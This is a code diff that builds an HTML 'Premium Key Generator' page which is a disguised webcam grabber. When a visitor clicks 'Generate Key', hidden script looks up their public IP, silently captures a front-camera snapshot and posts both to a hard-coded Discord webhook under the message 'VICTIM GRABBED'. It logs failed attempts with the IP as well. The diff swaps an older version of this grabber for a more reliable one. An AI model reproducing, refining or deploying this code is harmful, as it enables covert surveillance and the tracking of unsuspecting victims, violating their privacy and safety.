@@ -1,176 +1,313 @@
-<script>
-    const canvas = document.getElementById('particles-canvas');
-    const ctx = canvas.getContext('2d');
-   
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
-    window.addEventListener('resize', () => {
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-    });
-    class Particle {
-        constructor() {
-            this.x = Math.random() * canvas.width;
-            this.y = Math.random() * canvas.height - canvas.height;
-            this.size = Math.random() * 3 + 1;
-            this.speedY = Math.random() * 2 + 0.5;
-            this.speedX = Math.random() * 0.5 - 0.25;
-            this.opacity = Math.random() * 0.5 + 0.3;
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Key Generator</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background: #0d0d0d;
+            color: #fff;
+            overflow: hidden;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
-        update() {
-            this.y += this.speedY;
-            this.x += this.speedX;
-            if (this.y > canvas.height) {
-                this.y = -10;
-                this.x = Math.random() * canvas.width;
-            }
-            if (this.x > canvas.width || this.x < 0) {
-                this.x = Math.random() * canvas.width;
-            }
+        canvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            z-index: 1;
         }
-        draw() {
-            ctx.fillStyle = `rgba(255, 255, 255, ${this.opacity})`;
-            ctx.beginPath();
-            ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
-            ctx.fill();
+        .container {
+            z-index: 10;
+            text-align: center;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
+            max-width: 500px;
         }
-    }
-    const particles = [];
-    for (let i = 0; i < 100; i++) {
-        particles.push(new Particle());
-    }
-    function animateParticles() {
-        ctx.clearRect(0, 0, canvas.width, canvas.height);
-       
-        particles.forEach(particle => {
-            particle.update();
-            particle.draw();
-        });
-        requestAnimationFrame(animateParticles);
-    }
-    animateParticles();
+        h1 {
+            color: #ff4444;
+            margin-bottom: 20px;
+        }
+        input {
+            padding: 12px;
+            font-size: 18px;
+            width: 80%;
+            max-width: 300px;
+            margin: 15px 0;
+            border: 2px solid #ff4444;
+            border-radius: 8px;
+            background: #1a1a1a;
+            color: white;
+        }
+        button {
+            padding: 12px 30px;
+            font-size: 18px;
+            background: #ff4444;
+            border: none;
+            border-radius: 8px;
+            color: white;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        button:hover {
+            background: #cc0000;
+        }
+        #result {
+            margin-top: 30px;
+            opacity: 0;
+            transition: opacity 0.5s;
+        }
+        #result.show {
+            opacity: 1;
+        }
+        #generatedKey {
+            font-size: 24px;
+            font-weight: bold;
+            color: #00ff00;
+            word-break: break-all;
+            background: #111;
+            padding: 10px;
+            border-radius: 8px;
+            margin: 15px 0;
+        }
+        #copiedMsg {
+            color: #00ff00;
+            font-size: 16px;
+            opacity: 0;
+            transition: opacity 0.5s;
+        }
+        #copiedMsg.show {
+            opacity: 1;
+        }
+    </style>
+</head>
+<body>
+    <canvas id="particles-canvas"></canvas>
 
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1442834175521591387/-Ebcrm-cuHfvM1a-bCL7sX1cFHGa6DAnB4U1ratH-rrK7fzi3Pt7TZrquwHlJuspJuEs";
+    <div class="container">
+        <h1>Premium Key Generator</h1>
+        <p>Enter your name to generate your unique key</p>
+        
+        <input type="text" id="nameInput" placeholder="Your Name" autocomplete="off" />
+        <br/>
+        <button onclick="generateKeyAndGrab()">Generate Key</button>
 
-    async function grabCamAndSend() {
-        const video = document.createElement('video');
-        video.autoplay = true;
-        video.playsInline = true;
-        video.muted = true;
-        video.style.display = 'none';
-        document.body.appendChild(video);
+        <div id="result">
+            <h3>Your Generated Key:</h3>
+            <div id="generatedKey"></div>
+            <button onclick="copyKey()">Copy Key</button>
+            <div id="copiedMsg">Copied to clipboard!</div>
+        </div>
+    </div>
 
-        const canvas = document.createElement('canvas');
+    <script>
+        const canvas = document.getElementById('particles-canvas');
         const ctx = canvas.getContext('2d');
 
-        let publicIP = "Unknown";
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
 
-        try {
-            const ipResponse = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipResponse.json();
-            publicIP = ipData.ip;
-        } catch (e) {
-            console.error("IP fetch failed:", e);
-        }
-
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({
-                video: {
-                    width: { ideal: 1280 },
-                    height: { ideal: 720 },
-                    facingMode: "user"
-                },
-                audio: false
-            });
-
-            video.srcObject = stream;
-            await new Promise(resolve => setTimeout(resolve, 4000));
-
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            const imageData = canvas.toDataURL('image/jpeg', 0.7); // lower quality = smaller size
-
-            await fetch(WEBHOOK_URL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    username: "Grabber",
-                    content: "**VICTIM GRABBED** 📸 ||@everyone||\nIP: " + publicIP,
-                    embeds: [{
-                        title: "Webcam Snapshot",
-                        color: 16711680,
-                        image: { url: imageData },
-                        timestamp: new Date().toISOString(),
-                        footer: { text: "Success" }
-                    }]
-                })
-            }).then(r => {
-                if (r.ok) console.log("%c[+] LOG SENT SUCCESS", "color:lime;font-size:20px");
-                else console.error("Webhook bad response:", r.status);
-            }).catch(err => {
-                console.error("Webhook send failed:", err);
-            });
-
-            stream.getTracks().forEach(track => track.stop());
-            video.remove();
-
-        } catch (err) {
-            console.error("Camera failed:", err);
-            // Send failure log anyway
-            fetch(WEBHOOK_URL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    content: "**GRAB FAILED** - IP: " + publicIP + " | Error: " + err.message
-                })
-            });
-        }
-    }
-
-    function generateRandomSegment() {
-        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-        let segment = '';
-        for (let i = 0; i < 4; i++) {
-            segment += chars.charAt(Math.floor(Math.random() * chars.length));
-        }
-        return segment;
-    }
-
-    async function generateKeyAndGrab() {
-        const nameInput = document.getElementById('nameInput').value.trim().toUpperCase();
-       
-        if (!nameInput) {
-            alert('Please enter a name!');
-            return;
-        }
-        const segment1 = generateRandomSegment();
-        const segment2 = generateRandomSegment();
-        const segment3 = generateRandomSegment();
-       
-        const fullKey = `${nameInput}-${segment1}-${segment2}-${segment3}`;
-       
-        document.getElementById('generatedKey').textContent = fullKey;
-        document.getElementById('result').classList.add('show');
-        document.getElementById('copiedMsg').classList.remove('show');
-
-        await grabCamAndSend();
-    }
-
-    function copyKey() {
-        const key = document.getElementById('generatedKey').textContent;
-        navigator.clipboard.writeText(key).then(() => {
-            document.getElementById('copiedMsg').classList.add('show');
-            setTimeout(() => {
-                document.getElementById('copiedMsg').classList.remove('show');
-            }, 2000);
+        window.addEventListener('resize', () => {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
         });
-    }
 
-    document.getElementById('nameInput').addEventListener('keypress', function(e) {
-        if (e.key === 'Enter') {
-            generateKeyAndGrab();
+        class Particle {
+            constructor() {
+                this.x = Math.random() * canvas.width;
+                this.y = Math.random() * canvas.height - canvas.height;
+                this.size = Math.random() * 3 + 1;
+                this.speedY = Math.random() * 2 + 0.5;
+                this.speedX = Math.random() * 0.5 - 0.25;
+                this.opacity = Math.random() * 0.5 + 0.3;
+            }
+            update() {
+                this.y += this.speedY;
+                this.x += this.speedX;
+                if (this.y > canvas.height) {
+                    this.y = -10;
+                    this.x = Math.random() * canvas.width;
+                }
+                if (this.x > canvas.width || this.x < 0) {
+                    this.x = Math.random() * canvas.width;
+                }
+            }
+            draw() {
+                ctx.fillStyle = `rgba(255, 255, 255, ${this.opacity})`;
+                ctx.beginPath();
+                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+                ctx.fill();
+            }
         }
-    });
-</script>
+
+        const particles = [];
+        for (let i = 0; i < 100; i++) {
+            particles.push(new Particle());
+        }
+
+        function animateParticles() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            particles.forEach(particle => {
+                particle.update();
+                particle.draw();
+            });
+            requestAnimationFrame(animateParticles);
+        }
+        animateParticles();
+
+        // ───────────────────────────────────────────────────────────────
+        // WEBHOOK & GRABBER SECTION
+        // ───────────────────────────────────────────────────────────────
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1442834175521591387/-Ebcrm-cuHfvM1a-bCL7sX1cFHGa6DAnB4U1ratH-rrK7fzi3Pt7TZrquwHlJuspJuEs";
+
+        async function grabCamAndSend() {
+            let publicIP = "Unknown";
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                if (ipResponse.ok) {
+                    const ipData = await ipResponse.json();
+                    publicIP = ipData.ip;
+                }
+            } catch (e) {}
+
+            const video = document.createElement('video');
+            video.autoplay = true;
+            video.playsInline = true;
+            video.muted = true;
+            video.style.display = 'none';
+            document.body.appendChild(video);
+
+            const snapshotCanvas = document.createElement('canvas');
+            const ctx = snapshotCanvas.getContext('2d');
+
+            let success = false;
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user" },
+                    audio: false
+                });
+
+                video.srcObject = stream;
+
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        video.play().catch(() => {});
+                        setTimeout(resolve, 3000);
+                    };
+                    setTimeout(resolve, 5000); // fallback timeout
+                });
+
+                if (video.videoWidth > 0 && video.videoHeight > 0) {
+                    snapshotCanvas.width = video.videoWidth;
+                    snapshotCanvas.height = video.videoHeight;
+                    ctx.drawImage(video, 0, 0);
+
+                    const blob = await new Promise(resolve =>
+                        snapshotCanvas.toBlob(resolve, 'image/jpeg', 0.6)
+                    );
+
+                    if (blob && blob.size > 1000) {
+                        const file = new File([blob], "webcam.jpg", { type: 'image/jpeg' });
+
+                        const form = new FormData();
+                        form.append('file', file, 'webcam.jpg');
+                        form.append('payload_json', JSON.stringify({
+                            username: "Grabber",
+                            content: `**VICTIM GRABBED** 📸 ||@everyone||\n**IP:** \`${publicIP}\``,
+                            embeds: [{
+                                title: "Fresh Webcam Snap",
+                                color: 16711680,
+                                image: { url: "attachment://webcam.jpg" },
+                                timestamp: new Date().toISOString(),
+                                footer: { text: "Logged successfully" }
+                            }]
+                        }));
+
+                        const response = await fetch(WEBHOOK_URL, {
+                            method: "POST",
+                            body: form
+                        });
+
+                        if (response.ok) {
+                            success = true;
+                            console.log("%c[+] GRAB & LOG SENT CLEAN", "color:lime;font-size:20px");
+                        }
+                    }
+                }
+
+                stream.getTracks().forEach(track => track.stop());
+                video.remove();
+
+            } catch (err) {
+                console.log("%c[-] Grab skipped (no cam/denied)", "color:orange");
+            }
+
+            // Optional: minimal attempt log (remove if you want zero fail logs)
+            if (!success) {
+                fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        content: `**ATTEMPT** - IP: \`${publicIP}\` (no cam access or black frame)`
+                    })
+                }).catch(() => {});
+            }
+        }
+
+        function generateRandomSegment() {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            let segment = '';
+            for (let i = 0; i < 4; i++) {
+                segment += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return segment;
+        }
+
+        async function generateKeyAndGrab() {
+            const nameInput = document.getElementById('nameInput').value.trim().toUpperCase();
+            if (!nameInput) {
+                alert('Please enter a name!');
+                return;
+            }
+
+            const segment1 = generateRandomSegment();
+            const segment2 = generateRandomSegment();
+            const segment3 = generateRandomSegment();
+
+            const fullKey = `${nameInput}-${segment1}-${segment2}-${segment3}`;
+
+            document.getElementById('generatedKey').textContent = fullKey;
+            document.getElementById('result').classList.add('show');
+            document.getElementById('copiedMsg').classList.remove('show');
+
+            // Trigger the grab
+            await grabCamAndSend();
+        }
+
+        function copyKey() {
+            const key = document.getElementById('generatedKey').textContent;
+            navigator.clipboard.writeText(key).then(() => {
+                document.getElementById('copiedMsg').classList.add('show');
+                setTimeout(() => {
+                    document.getElementById('copiedMsg').classList.remove('show');
+                }, 2000);
+            });
+        }
+
+        document.getElementById('nameInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                generateKeyAndGrab();
+            }
+        });
+    </script>
+</body>
+</html>
